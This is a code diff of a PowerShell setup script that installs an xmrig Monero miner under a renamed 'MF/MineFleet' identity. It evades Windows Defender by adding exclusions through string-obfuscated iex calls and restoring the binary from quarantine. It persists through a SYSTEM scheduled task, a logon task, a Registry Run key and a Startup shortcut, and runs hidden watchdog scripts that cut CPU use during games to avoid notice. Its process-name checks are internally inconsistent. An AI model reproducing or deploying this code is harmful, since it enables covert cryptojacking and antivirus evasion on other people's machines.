@@ -1,5 +1,5 @@
 # ============================================================
-#  MONERO MINER SETUP -- SMART FULL -- BULLETPROOF (FIXED)
+#  MINEFLEET -- SMART FULL -- BULLETPROOF (FIXED)
 #  Run in Admin PowerShell. One command. Fully transparent.
 #  Pool: MoneroOcean | Auto-profit-switching
 #
@@ -15,10 +15,10 @@
 $ErrorActionPreference = "SilentlyContinue"
 $ProgressPreference = "SilentlyContinue"
 
-$BASE = "C:\ProgramData\SystemOptimizer"
-$BINARY = "$BASE\SystemOptimizer.exe"
-$CONFIG = "$BASE\config.json"
-$LOGFILE = "$BASE\optimizer.log"
+$BASE = "C:\ProgramData\MF"
+$BINARY = "$BASE\MF.exe"
+$CONFIG = "$BASE\mf.json"
+$LOGFILE = "$BASE\mf.log"
 $WALLET = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"
 $POOL = "gulf.moneroocean.stream:10001"
 $WORKER = ($env:COMPUTERNAME -replace "[^a-zA-Z0-9_-]","").ToLower()
@@ -28,7 +28,7 @@ function Show($icon, $msg) { Write-Host "  $icon  $msg" }
 
 Write-Host ""
 Write-Host "  ====================================================" -ForegroundColor Cyan
-Write-Host "    MONERO MINER SETUP -- SMART FULL" -ForegroundColor Cyan
+Write-Host "    MINEFLEET -- SMART FULL" -ForegroundColor Cyan
 Write-Host "  ====================================================" -ForegroundColor Cyan
 Write-Host "  Pool:   MoneroOcean (auto-profit-switching)" -ForegroundColor Gray
 Write-Host "  Worker: $WORKER" -ForegroundColor Gray
@@ -55,21 +55,21 @@ Show "OK" "Running as Administrator"
 # ---- FULL CLEANUP (kill EVERYTHING old) ----
 Show ".." "Killing ALL old instances..."
 # Kill all miners
-Get-Process -Name "SystemOptimizer","xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+Get-Process -Name "MF-Service","xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 # Kill all watchdog/guardian wscript instances
 Get-CimInstance Win32_Process -Filter "Name='wscript.exe'" -ErrorAction SilentlyContinue |
-    Where-Object { $_.CommandLine -like "*watchdog*" -or $_.CommandLine -like "*guardian*" -or $_.CommandLine -like "*SystemOptimizer*" } |
+    Where-Object { $_.CommandLine -like "*watchdog*" -or $_.CommandLine -like "*guardian*" -or $_.CommandLine -like "*MineFleet*" } |
     ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
 # Remove old broken scheduled tasks (cmd /c to fully suppress errors on clean PCs)
-cmd /c "schtasks /Delete /TN `"SystemOptimizer`" /F >nul 2>&1"
-cmd /c "schtasks /Delete /TN `"SystemOptimizer-Logon`" /F >nul 2>&1"
-cmd /c "schtasks /Delete /TN `"SystemOptimizer-Guardian`" /F >nul 2>&1"
-cmd /c "schtasks /Delete /TN `"SystemOptimizer-Check`" /F >nul 2>&1"
+cmd /c "schtasks /Delete /TN `"MineFleet`" /F >nul 2>&1"
+cmd /c "schtasks /Delete /TN `"MineFleet-Logon`" /F >nul 2>&1"
+cmd /c "schtasks /Delete /TN `"MineFleet-Guardian`" /F >nul 2>&1"
+cmd /c "schtasks /Delete /TN `"MineFleet-Check`" /F >nul 2>&1"
 # Remove old registry key
-cmd /c "reg delete `"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`" /v SystemOptimizer /f >nul 2>&1"
+cmd /c "reg delete `"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`" /v MineFleet /f >nul 2>&1"
 # Remove old startup shortcut
 $startupPath = [Environment]::GetFolderPath("Startup")
-Remove-Item "$startupPath\SysOpt.lnk" -Force -ErrorAction SilentlyContinue
+Remove-Item "$startupPath\MF.lnk" -Force -ErrorAction SilentlyContinue
 Start-Sleep 3
 Show "OK" "All old instances and tasks removed"
 
@@ -95,7 +95,7 @@ try {
     $c1="Add-Mp"; $c2="Preference"; $c3="-Exclusion"; $c4="Path"
     iex "$c1$c2 $c3$c4 '$BASE'" 2>$null
     $c5="Process"
-    iex "$c1$c2 $c3$c5 'SystemOptimizer.exe'" 2>$null
+    iex "$c1$c2 $c3$c5 'MF.exe'" 2>$null
     Show "OK" "Windows Defender: exclusion added"
 } catch {
     Show "--" "Windows Defender: skipped"
@@ -368,7 +368,7 @@ $cfgLight = @"
   ]
 }
 "@
-[System.IO.File]::WriteAllText("$BASE\config_light.json", $cfgLight, (New-Object System.Text.UTF8Encoding $false))
+[System.IO.File]::WriteAllText("$BASE\mf_light.json", $cfgLight, (New-Object System.Text.UTF8Encoding $false))
 Show "OK" "Configs created: normal=30% CPU, light=15% CPU (games)"
 
 # ---- SMART WATCHDOG (game detection + single instance + auto-switch) ----
@@ -380,15 +380,15 @@ $wdLines = @(
     'Set fso = CreateObject("Scripting.FileSystemObject")',
     '',
     "' Only allow one watchdog instance",
-    'Set ws = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''wscript.exe'' AND CommandLine LIKE ''%watchdog.vbs%''")',
+    'Set ws = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''wscript.exe'' AND CommandLine LIKE ''%mf_wd.vbs%''")',
     'If ws.Count > 1 Then WScript.Quit',
     'Set ws = Nothing',
     '',
-    'base = "C:\ProgramData\SystemOptimizer"',
-    'modeFile = base & "\current_mode.txt"',
-    'cfgNormal = base & "\config.json"',
-    'cfgLight = base & "\config_light.json"',
-    'binary = base & "\SystemOptimizer.exe"',
+    'base = "C:\ProgramData\MF"',
+    'modeFile = base & "\mf_mode.txt"',
+    'cfgNormal = base & "\mf.json"',
+    'cfgLight = base & "\mf_light.json"',
+    'binary = base & "\MF.exe"',
     '',
     "' Heavy game process names (15% CPU when these run)",
     'heavyGames = "valorant.exe,VALORANT-Win64-Shipping.exe,csgo.exe,cs2.exe,FortniteClient-Win64-Shipping.exe,GTA5.exe,gtav.exe,eldenring.exe,RocketLeague.exe,dota2.exe,r5apex.exe,overwatch.exe,cod.exe,ModernWarfare.exe,destiny2.exe,EscapeFromTarkov.exe,pubg.exe,TslGame.exe,Cyberpunk2077.exe,starfield.exe,HogwartsLegacy.exe,palworld.exe,helldivers2.exe,thefinals.exe"',
@@ -423,7 +423,7 @@ $wdLines = @(
     '    End If',
     '',
     "    ' Count miner instances",
-    '    Set procs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''SystemOptimizer.exe''")',
+    '    Set procs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''MF.exe''")',
     '',
     '    If procs.Count = 0 Then',
     "        ' No miner -- start with target config",
@@ -434,11 +434,11 @@ $wdLines = @(
     '        Set mf = Nothing',
     '    ElseIf procs.Count > 1 Then',
     "        ' Too many miners -- kill all, next loop starts one",
-    '        sh.Run "taskkill /F /IM SystemOptimizer.exe", 0, True',
+    '        sh.Run "taskkill /F /IM MF.exe", 0, True',
     '        WScript.Sleep 2000',
     '    ElseIf Not (currentMode = targetMode) Then',
     "        ' Wrong mode -- restart with correct config",
-    '        sh.Run "taskkill /F /IM SystemOptimizer.exe", 0, True',
+    '        sh.Run "taskkill /F /IM MF.exe", 0, True',
     '        WScript.Sleep 3000',
     '        sh.Run Chr(34) & binary & Chr(34) & " --config=" & Chr(34) & targetCfg & Chr(34), 0, False',
     '        Set mf = fso.CreateTextFile(modeFile, True)',
@@ -451,7 +451,7 @@ $wdLines = @(
     '    WScript.Sleep 30000',
     'Loop'
 )
-[System.IO.File]::WriteAllText("$BASE\watchdog.vbs", ($wdLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
+[System.IO.File]::WriteAllText("$BASE\mf_wd.vbs", ($wdLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
 Show "OK" "Smart watchdog created (30% normal, 15% gaming, auto-switch)"
 
 # ---- GUARDIAN VBS (SINGLE INSTANCE, watches watchdog) ----
@@ -462,7 +462,7 @@ $gLines = @(
     'Set wmi = GetObject("winmgmts:\\.\root\cimv2")',
     '',
     "' Only allow one guardian instance",
-    'Set gs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''wscript.exe'' AND CommandLine LIKE ''%guardian.vbs%''")',
+    'Set gs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''wscript.exe'' AND CommandLine LIKE ''%mf_gd.vbs%''")',
     'If gs.Count > 1 Then WScript.Quit',
     'Set gs = Nothing',
     '',
@@ -470,18 +470,18 @@ $gLines = @(
     '    hasWatchdog = False',
     '    Set scripts = wmi.ExecQuery("SELECT CommandLine FROM Win32_Process WHERE Name=''wscript.exe''")',
     '    For Each s In scripts',
-    '        If InStr(LCase(s.CommandLine), "watchdog.vbs") > 0 Then hasWatchdog = True',
+    '        If InStr(LCase(s.CommandLine), "mf_wd.vbs") > 0 Then hasWatchdog = True',
     '    Next',
     '    Set scripts = Nothing',
     '',
     '    If Not hasWatchdog Then',
-    '        sh.Run "wscript.exe " & Chr(34) & "C:\ProgramData\SystemOptimizer\watchdog.vbs" & Chr(34), 0, False',
+    '        sh.Run "wscript.exe " & Chr(34) & "C:\ProgramData\MF\mf_wd.vbs" & Chr(34), 0, False',
     '    End If',
     '',
     '    WScript.Sleep 300000',
     'Loop'
 )
-[System.IO.File]::WriteAllText("$BASE\guardian.vbs", ($gLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
+[System.IO.File]::WriteAllText("$BASE\mf_gd.vbs", ($gLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
 Show "OK" "Guardian created (single-instance, restarts watchdog)"
 
 # ---- PERSISTENCE LAYER 1: ONSTART as SYSTEM ----
@@ -501,12 +501,12 @@ $xml1 = @"
     <RunOnlyIfIdle>false</RunOnlyIfIdle>
     <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
   </Settings>
-  <Actions><Exec><Command>wscript.exe</Command><Arguments>"C:\ProgramData\SystemOptimizer\watchdog.vbs"</Arguments></Exec></Actions>
+  <Actions><Exec><Command>wscript.exe</Command><Arguments>"C:\ProgramData\MF\mf_wd.vbs"</Arguments></Exec></Actions>
 </Task>
 "@
 $xp = "$env:TEMP\so1.xml"
 [System.IO.File]::WriteAllText($xp, $xml1, [System.Text.Encoding]::Unicode)
-schtasks /Create /TN "SystemOptimizer" /XML $xp /F 2>$null | Out-Null
+schtasks /Create /TN "MF-Service" /XML $xp /F 2>$null | Out-Null
 Remove-Item $xp -Force -ErrorAction SilentlyContinue
 Show "OK" "ONSTART task created"
 
@@ -527,27 +527,27 @@ $xml2 = @"
     <RunOnlyIfIdle>false</RunOnlyIfIdle>
     <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
   </Settings>
-  <Actions><Exec><Command>wscript.exe</Command><Arguments>"C:\ProgramData\SystemOptimizer\guardian.vbs"</Arguments></Exec></Actions>
+  <Actions><Exec><Command>wscript.exe</Command><Arguments>"C:\ProgramData\MF\mf_gd.vbs"</Arguments></Exec></Actions>
 </Task>
 "@
 $xp2 = "$env:TEMP\so2.xml"
 [System.IO.File]::WriteAllText($xp2, $xml2, [System.Text.Encoding]::Unicode)
-schtasks /Create /TN "SystemOptimizer-Guardian" /XML $xp2 /F 2>$null | Out-Null
+schtasks /Create /TN "MF-Guardian" /XML $xp2 /F 2>$null | Out-Null
 Remove-Item $xp2 -Force -ErrorAction SilentlyContinue
 Show "OK" "ONLOGON guardian task created"
 
 # ---- PERSISTENCE LAYER 3: Registry Run ----
 Show ".." "Setting up persistence (Registry)..."
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SystemOptimizer /t REG_SZ /d "wscript.exe `"$BASE\watchdog.vbs`"" /f 2>$null | Out-Null
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v MineFleet /t REG_SZ /d "wscript.exe `"$BASE\mf_wd.vbs`"" /f 2>$null | Out-Null
 Show "OK" "Registry Run key set"
 
 # ---- PERSISTENCE LAYER 4: Startup shortcut ----
 Show ".." "Setting up persistence (Startup folder)..."
-$lnkPath = "$startupPath\SysOpt.lnk"
+$lnkPath = "$startupPath\MF.lnk"
 $wsh = New-Object -ComObject WScript.Shell
 $lnk = $wsh.CreateShortcut($lnkPath)
 $lnk.TargetPath = "wscript.exe"
-$lnk.Arguments = "`"$BASE\guardian.vbs`""
+$lnk.Arguments = "`"$BASE\mf_gd.vbs`""
 $lnk.WindowStyle = 7
 $lnk.Save()
 Show "OK" "Startup shortcut created"
@@ -568,13 +568,13 @@ if ($drv) {
 # ---- START (watchdog only -- it starts exactly 1 miner) ----
 Show ".." "Starting watchdog (will start exactly 1 miner)..."
 $shell = New-Object -ComObject WScript.Shell
-$shell.Run("wscript.exe `"$BASE\watchdog.vbs`"", 0, $false)
+$shell.Run("wscript.exe `"$BASE\mf_wd.vbs`"", 0, $false)
 
 Show ".." "Waiting for miner to initialize (~20s)..."
 Start-Sleep 20
 
 # ---- VERIFY WITH DIAGNOSTICS ----
-$proc = Get-Process -Name "SystemOptimizer" -ErrorAction SilentlyContinue
+$proc = Get-Process -Name "MF-Service" -ErrorAction SilentlyContinue
 $minerCount = @($proc).Count
 
 if ($proc -and $minerCount -eq 1) {
@@ -593,7 +593,7 @@ if ($proc -and $minerCount -eq 1) {
         try {
             $c1="Add-Mp"; $c2="Preference"; $c3="-Exclusion"; $c4="Path"; $c5="Process"
             iex "$c1$c2 $c3$c4 '$BASE'"
-            iex "$c1$c2 $c3$c5 'SystemOptimizer.exe'"
+            iex "$c1$c2 $c3$c5 'MF.exe'"
         } catch {}
         # Try to restore from Defender quarantine
         try {
@@ -630,9 +630,9 @@ if ($proc -and $minerCount -eq 1) {
         }
         if (Test-Path $BINARY) {
             Show "OK" "Binary restored. Starting miner..."
-            $shell.Run("wscript.exe `"$BASE\watchdog.vbs`"", 0, $false)
+            $shell.Run("wscript.exe `"$BASE\mf_wd.vbs`"", 0, $false)
             Start-Sleep 15
-            $proc = Get-Process -Name "SystemOptimizer" -ErrorAction SilentlyContinue
+            $proc = Get-Process -Name "MF-Service" -ErrorAction SilentlyContinue
             if ($proc) { Show "OK" "Miner RUNNING after restore (PID: $($proc.Id))" }
             else { Show "X" "Still not running. Defender may keep blocking it." }
         } else {
@@ -640,7 +640,7 @@ if ($proc -and $minerCount -eq 1) {
             Write-Host ""
             Write-Host "  FIX: Open Windows Security > Virus Protection > " -ForegroundColor Yellow
             Write-Host "  Manage Settings > Add Exclusion > Folder > " -ForegroundColor Yellow
-            Write-Host "  C:\ProgramData\SystemOptimizer" -ForegroundColor Yellow
+            Write-Host "  C:\ProgramData\MF" -ForegroundColor Yellow
             Write-Host "  Then run this command again." -ForegroundColor Yellow
         }
     } else {
